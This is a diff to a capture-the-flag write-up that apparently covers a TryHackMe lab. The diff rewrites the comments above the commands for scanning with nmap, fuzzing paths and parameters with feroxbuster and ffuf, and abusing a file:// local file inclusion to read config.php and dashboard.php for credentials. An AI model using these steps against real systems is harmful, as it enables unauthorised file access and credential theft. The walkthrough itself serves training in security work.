@@ -52,8 +52,8 @@ admin flag THM{LOGGED_IN_ADM1N1}
 ## 1. Reconnaissance
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run a full port scan and service enumeration.
+# Why here: identify the primary attack surface, specifically the Apache and BIND services.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
 nmap -sVC -p22,53,80 $TARGET -oN service
 ```
@@ -71,8 +71,8 @@ See [nmap.md](../../tools/recon/nmap.md).
 ## 2. Web Enumeration
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: perform directory and file discovery with Feroxbuster.
+# Why here: discover hidden PHP files or endpoints mentioned in the documentation or leaked via .DS_Store.
 feroxbuster -u http://$TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 # /phpmyadmin/
 # /api.php       ? docs leak the LFI endpoint
@@ -97,8 +97,8 @@ Full technique: [php-source-disclosure-lfi.md](../../exploits/web-disclosure/php
 ### 3a. Confirm the parameter
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: probe the file.php endpoint with the discovered parameter.
+# Why here: verify the arbitrary file read primitive before attempting to leak sensitive source code.
 curl http://$TARGET/file.php?cv
 # Only local files are allowed
 curl http://$TARGET/file.php?user
@@ -107,8 +107,8 @@ curl http://$TARGET/file.php?user
 
 Cross-check by fuzzing the parameter name:
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: brute-force parameter names on file.php.
+# Why here: confirm that 'cv' is the only accepted parameter for the file read logic.
 ffuf -u "http://$TARGET/file.php?FUZZ" \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -fw 3
 # only `cv` produces non-baseline
@@ -117,8 +117,8 @@ ffuf -u "http://$TARGET/file.php?FUZZ" \
 ### 3b. Find readable paths
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: fuzz the local filesystem using the file:// wrapper.
+# Why here: identify readable paths like .htaccess that confirm the LFI vulnerability.
 ffuf -u "http://$TARGET/file.php?cv=file:///FUZZ" \
   -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 2
 # /var/www/html/.htaccess  [Status: 200, Size: 460]
@@ -133,8 +133,8 @@ The filter only allows reads under the webroot, but **`file://` is honoured** 
 ### 4a. Brute `.php` filenames
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: brute-force common PHP filenames under the webroot.
+# Why here: find the location of config.php and other sensitive source files for the next pivot.
 ffuf -u "http://$TARGET/file.php?cv=file:///var/www/html/FUZZ.php" \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -fw 2
 # index, config, api, dashboard, header, footer, file
@@ -143,8 +143,8 @@ ffuf -u "http://$TARGET/file.php?cv=file:///var/www/html/FUZZ.php" \
 ### 4b. Pull `config.php`
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: leak the source code of config.php.
+# Why here: extract hardcoded credentials for the HR user and identify the API version.
 curl "http://$TARGET/file.php?cv=file:///var/www/html/config.php"
 ```
 
@@ -176,8 +176,8 @@ Full technique: [sql-union-injection.md](../../exploits/web-disclosure/sql-union
 ### 5a. Read the source
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: leak the source code of dashboard.php.
+# Why here: analyze the search logic to identify the SQL injection vulnerability.
 curl "http://$TARGET/file.php?cv=file:///var/www/html/dashboard.php"
 ```
 
